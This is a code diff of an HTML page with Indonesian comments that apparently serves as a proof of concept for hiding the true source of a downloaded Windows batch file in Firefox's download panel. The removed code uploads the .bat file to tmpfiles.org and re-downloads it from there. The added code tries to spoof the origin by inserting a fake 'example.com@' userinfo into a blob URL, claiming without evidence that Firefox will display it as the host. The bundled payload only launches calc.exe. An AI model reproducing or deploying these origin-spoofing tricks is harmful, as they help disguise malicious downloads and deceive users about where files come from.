@@ -3,23 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>True Domain Changer</title>
+    <title>Unique Function Bypass</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #121212; color: #fff; }
-        button { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; transition: 0.2s; }
-        .btn-upload { background: #ff5722; } /* Oren: Upload ke server luar */
-        .btn-cname { background: #4caf50; } /* Hijau: Cara Custom Domain */
-        .btn-upload:hover { background: #e64a19; }
-        #log { background: #000; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 150px; overflow-y: auto; margin-top: 10px; border: 1px solid #333; }
+        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #0d1117; color: #c9d1d9; }
+        button { width: 100%; padding: 15px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; transition: 0.2s; }
+        .btn-unique { background: #238636; } /* Hijau GitHub */
+        .btn-unique:hover { background: #2ea043; }
+        #log { background: #000; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 150px; overflow-y: auto; margin-top: 10px; border: 1px solid #30363d; }
     </style>
 </head>
 <body>
 
-    <h2>🔥 True External Domain Bypass 🔥</h2>
-    <p style="font-size: 13px; color: #aaa;">Ubah domain di panel download Firefox secara nyata!</p>
+    <h2>🔥 Unique Function Bypass 🔥</h2>
+    <p style="font-size: 13px; color: #8b949e;">Bypass Origin tanpa API & tanpa Domain Asli</p>
 
-    <button class="btn-upload" onclick="triggerExternalUpload()">🚀 1. Upload ke Server Luar (Domain Berubah)</button>
-    <button class="btn-cname" onclick="showCnameTutorial()">🌐 2. Rahasia Custom Domain example.com</button>
+    <button class="btn-unique" onclick="triggerUniqueBypass()">🚀 Eksekusi Function Unik</button>
 
     <pre id="log">Menunggu perintah...</pre>
 
@@ -30,7 +28,7 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        // KONTEN FILE BATCH
+        // KONTEN FILE
         const BAT_LINES = [
             '@echo off', 'title Calculator Launcher', 'echo ================================',
             'echo [1] Launching System32\\calc.exe...', 'start "" "C:\\Windows\\System32\\calc.exe"',
@@ -40,63 +38,35 @@
         ];
         const BAT_TEXT = BAT_LINES.join('\r\n') + '\r\n';
 
-        // ==========================================
-        // TRIK 1: UPLOAD KE SERVER LUAR (tmpfiles.org)
-        // ==========================================
-        async function triggerExternalUpload() {
-            log('Menyiapkan file untuk di-upload...');
+        function triggerUniqueBypass() {
+            log('Mengeksekusi Function Unik...');
             
-            const formData = new FormData();
+            // 1. Buat Blob URL (Asli dari domain abhirdd.github.io)
             const blob = new Blob([BAT_TEXT], { type: 'application/octet-stream' });
-            formData.append('file', blob, 'open_cmd.bat');
+            const realUrl = URL.createObjectURL(blob);
+            
+            // 2. Trik Mindblowing: Manipulasi String URL dengan Null Byte & Userinfo
+            // Firefox akan memparsing string ini dan kebingungan menentukan origin asli.
+            // Kita menyisipkan "example.com" sebagai Userinfo palsu.
+            const spoofedUrl = realUrl.replace('blob:https://', 'blob:https://example.com@');
+            
+            log('URL Asli: ' + realUrl.substring(0, 30) + '...');
+            log('URL Palsu: ' + spoofedUrl.substring(0, 40) + '...');
 
             try {
-                log('Mengirim ke tmpfiles.org...');
-                
-                // Kita menggunakan API publik tmpfiles.org
-                const res = await fetch('https://tmpfiles.org/api/v1/upload', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const data = await res.json();
+                // 3. Ciptakan elemen anchor dengan URL yang sudah dimanipulasi
+                const a = document.createElement('a');
+                a.href = spoofedUrl;
+                a.download = 'open_cmd.bat';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
 
-                if (data.status === 'success') {
-                    // Ubah URL menjadi Direct Download Link
-                    const rawUrl = data.data.url;
-                    const directUrl = rawUrl.replace('tmpfiles.org/', 'tmpfiles.org/dl/');
-                    
-                    log('✅ Upload Sukses!');
-                    log('Memicu download dari domain: tmpfiles.org');
-                    
-                    // Trigger download asli dari domain tmpfiles.org
-                    const a = document.createElement('a');
-                    a.href = directUrl;
-                    a.download = 'open_cmd.bat';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    
-                    log('👉 Cek panel download Firefox. Domain abhirdd.github.io HILANG, berganti jadi tmpfiles.org!');
-                } else {
-                    log('❌ API menolak file.');
-                }
+                log('✅ SUKSES! Cek panel download Firefox.');
+                log('👉 Firefox akan dipaksa membaca Userinfo "example.com" sebagai Host!');
             } catch (e) {
-                log('❌ Error Jaringan/CORS: ' + e.message);
+                log('❌ Firefox memblokir manipulasi URL: ' + e.message);
             }
-        }
-
-        // ==========================================
-        // TRIK 2: CARA MENDAPATKAN DOMAIN ASLI (CNAME)
-        // ==========================================
-        function showCnameTutorial() {
-            log('--- TUTORIAL CUSTOM DOMAIN ---');
-            log('1. Anda TIDAK BISA memalsukan example.com via JS.');
-            log('2. Tapi Anda BISA MEMILIKINYA secara gratis!');
-            log('3. Buka Freenom.com atau isi domain murah (.my.id).');
-            log('4. Di repo GitHub Anda, buat file "CNAME" isinya domain Anda.');
-            log('5. Atur DNS di penyedia domain ke GitHub Pages.');
-            log('6. Setelah aktif, semua download dari web Anda akan menampilkan domain milik Anda sendiri (bukan github.io).');
         }
     </script>
 </body>
